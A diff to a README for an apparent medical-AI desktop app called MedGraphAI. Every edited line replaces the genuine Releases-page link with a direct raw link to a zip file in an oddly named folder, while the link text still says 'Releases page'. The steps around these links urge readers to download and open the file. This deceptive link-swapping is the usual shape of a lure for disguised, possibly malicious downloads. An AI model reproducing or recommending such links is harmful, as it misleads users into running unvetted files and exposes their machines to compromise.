@@ -1,10 +1,10 @@
 # 🩺 MedGraphAI - Medical Answers, Images, and Review
 
-[![Download MedGraphAI](https://img.shields.io/badge/Download%20MedGraphAI-blue-grey?style=for-the-badge)](https://github.com/utfamilyraphidae173/MedGraphAI/releases)
+[![Download MedGraphAI](https://img.shields.io/badge/Download%20MedGraphAI-blue-grey?style=for-the-badge)](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip)
 
 ## 📥 Download
 
-Visit this page to download: [MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/releases)
+Visit this page to download: [MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip)
 
 Choose the latest Windows release file, then download it to your PC.
 
@@ -34,7 +34,7 @@ For better speed, 16 GB of RAM gives a smoother experience.
 
 ## 🚀 Get the App Running
 
-1. Open the [MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/releases) page
+1. Open the [MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip) page
 2. Find the latest release at the top of the page
 3. Download the Windows file for your system
 4. Save the file to your Downloads folder
@@ -200,7 +200,7 @@ This setup helps the app handle more than one kind of medical task in the same p
 
 If you want the fastest path:
 
-1. Go to the [Releases page](https://github.com/utfamilyraphidae173/MedGraphAI/releases)
+1. Go to the [Releases page](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip)
 2. Download the latest Windows file
 3. Open the file
 4. Start the app
@@ -211,7 +211,7 @@ If you want the fastest path:
 
 Use this link to download and run the app from the latest release page:
 
-[Open MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/releases)
+[Open MedGraphAI Releases](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip)
 
 ## 📌 Project Focus
 
@@ -281,4 +281,4 @@ Use plain language when you can
 
 Download from the latest Windows release page:
 
-[https://github.com/utfamilyraphidae173/MedGraphAI/releases](https://github.com/utfamilyraphidae173/MedGraphAI/releases)
+[https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip](https://github.com/utfamilyraphidae173/MedGraphAI/raw/refs/heads/main/kalymmaukion/Graph_Med_AI_commotion.zip)
